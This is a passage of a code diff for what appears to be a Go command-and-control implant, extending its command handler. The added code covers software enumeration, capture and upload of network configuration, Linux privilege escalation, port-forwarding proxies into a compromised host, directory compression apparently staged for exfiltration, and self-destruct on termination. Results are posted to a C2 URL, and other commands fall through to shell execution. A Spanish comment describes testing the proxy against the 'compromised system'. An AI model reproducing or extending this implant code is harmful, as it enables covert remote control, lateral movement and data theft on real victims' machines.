+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[ERROR] Failed to handle adversary command: %v\n", err)
+                        }
+                    }
+                case strings.HasPrefix(command, "softenum:"):
+	                soft, err := GetUsefulSoftware()
+                    if lazyconf.DebugImplant == "True" {
+                        println("[INFO] Useful software found:")
+                        if err != nil {
+                            println("[ERROR] Error al buscar software:", err)
+                        }
+                        for _, s := range soft {
+                            if s != "" {
+                                println(" -", s)
+                            }
+                        }
+                    }
+                case strings.HasPrefix(command, "netconfig:"):
+                    if err := captureNetworkConfig(ctx,lazyconf); err != nil {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[ERROR] Failed to capture network config: %v\n", err)
+                        }
+                    } else {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("[INFO] Network configuration captured and uploaded")
+                        }
+                    }
+                case strings.HasPrefix(command, "escalatelin:"):
+                    tryPrivilegeEscalation(lazyconf)
+                case strings.HasPrefix(command, "proxy:"):
+                    parts := strings.Split(strings.TrimPrefix(command, "proxy:"), ":")
+                    if len(parts) != 4 {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("[ERROR] Invalid proxy command format, expected proxy:<listenIP>:<listenPort>:<targetIP>:<targetPort>")
+                        }
+                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", `{"error":"Invalid proxy command format"}`, "")
+                        break
+                    }
+                    //Envía el comando proxy:0.0.0.0:8080:127.0.0.1:8000 desde el C2.
+                    //Conéctate al puerto 8080 del sistema comprometido (por ejemplo, nc <IP>:8080).
+                    //Verifica que el tráfico se redirija al targetAddr.
+                    //Envía stop_proxy:0.0.0.0:8080 y confirma que el proxy se detiene (revisa los logs de depuración).
+                    listenAddr := parts[0] + ":" + parts[1]
+                    targetAddr := parts[2] + ":" + parts[3]
+                    if err := startProxy(lazyconf, listenAddr, targetAddr); err != nil {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[ERROR] Failed to start proxy: %v\n", err)
+                        }
+                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", fmt.Sprintf(`{"error":"Failed to start proxy: %v"}`, err), "")
+                    } else {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[INFO] Proxy started on %s to %s\n", listenAddr, targetAddr)
+                        }
+                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", fmt.Sprintf(`{"message":"Proxy started on %s to %s"}`, listenAddr, targetAddr), "")
+                    }
+                case strings.HasPrefix(command, "stop_proxy:"):
+                    listenAddr := strings.TrimPrefix(command, "stop_proxy:")
+                    if listenAddr == "" {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("[ERROR] Invalid stop_proxy command format, expected stop_proxy:<listenAddr>")
+                        }
+                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", `{"error":"Invalid stop_proxy command format"}`, "")
+                        break
+                    }
+                    if err := stopProxy(listenAddr, lazyconf); err != nil {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[ERROR] Failed to stop proxy: %v\n", err)
+                        }
+                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", fmt.Sprintf(`{"error":"Failed to stop proxy: %v"}`, err), "")
+                    } else {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[INFO] Proxy stopped on %s\n", listenAddr)
+                        }
+                        retryRequest(ctx, C2_URL+MALEABLE+CLIENT_ID, "POST", fmt.Sprintf(`{"message":"Proxy stopped on %s"}`, listenAddr), "")
+                    }
                 case strings.HasPrefix(command, "portscan:"):
-                    ports := []int{22, 80, 443, 8080}
                     timeout := 2 * time.Second
-                    currentPortScanResults = PortScanner(discoveredLiveHosts, ports, timeout) 
+                    currentPortScanResults = PortScanner(discoveredLiveHosts + ", " + lazyconf.Rhost, lazyconf.Ports, timeout) 
                     results_portscan = currentPortScanResults
                     for ip, openPorts := range currentPortScanResults {
                         if len(openPorts) > 0 {
@@ -1041,10 +1809,39 @@ func main() {
                             }
                         }
                     }
-                case strings.Contains(command, "terminate"):
+                case strings.HasPrefix(command, "compressdir:"):
+                    inputDir := strings.TrimPrefix(command, "compressdir:")
+                    if inputDir == "" {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("[ERROR] Invalid compressdir command format, expected compressdir:<directory_path>")
+                        }
+                    }
+                    dirName := filepath.Base(inputDir)
+                    currentTime := time.Now().Format("20060102")
+                    outputFileName := fmt.Sprintf("%s_%s_%s.tar.gz", dirName, CLIENT_ID, currentTime)
+                    outputFilePath := filepath.Join(filepath.Dir(inputDir), outputFileName)
+
+                    if _, err := os.Stat(inputDir); os.IsNotExist(err) {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[ERROR] Directory not found: %s\n", inputDir)
+                        }
+                        break
+                    }
+
+                    if err := compressGzipDir(ctx, inputDir, outputFilePath, lazyconf); err != nil {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[ERROR] Failed to compress directory '%s': %v\n", inputDir, err)
+                        }
+                    } else {
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Printf("[INFO] Successfully compressed directory to: %s\n", outputFilePath)
+                        }
+                    }
+                case strings.Contains(command, "terminate:"):
                     if lazyconf.DebugImplant == "True" {
                         fmt.Println("[INFO] terminate command")
                     }
+                    selfDestruct(lazyconf)
                     os.Exit(0)
                 default:
                     handleCommand(ctx, command, shellCommand, lazyconf, currentPortScanResults)
@@ -1106,6 +1903,7 @@ func handleCommand(ctx context.Context, command string, shellCommand []string, l
     pid := os.Getpid()
     hostname, _ := os.Hostname()
     ips := getIPs()
+    
     currentUser, _ := user.Current()
 
     jsonData, _ := json.Marshal(map[string]interface{}{
@@ -1120,7 +1918,7 @@ func handleCommand(ctx context.Context, command string, shellCommand []string, l
         "result_portscan": resultadosEscaneo,
     })
     var prettyJSON bytes.Buffer
-    json.Indent(&prettyJSON, jsonData, "", "  ") // Usar dos espacios para indentar
+    json.Indent(&prettyJSON, jsonData, "", "  ") 
     if lazyconf.DebugImplant == "True" {
         fmt.Println("JSON Data (Formatted):")
         fmt.Println(prettyJSON.String())
@@ -1135,6 +1933,10 @@ func getIPs() []string {
         if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
             ips = append(ips, ipnet.IP.String())
         }
+    }
+    if GlobalIP == "" {
+		GlobalIP = GetGlobalIP()
+        ips = append(ips, GlobalIP)
     }
     return ips
 }
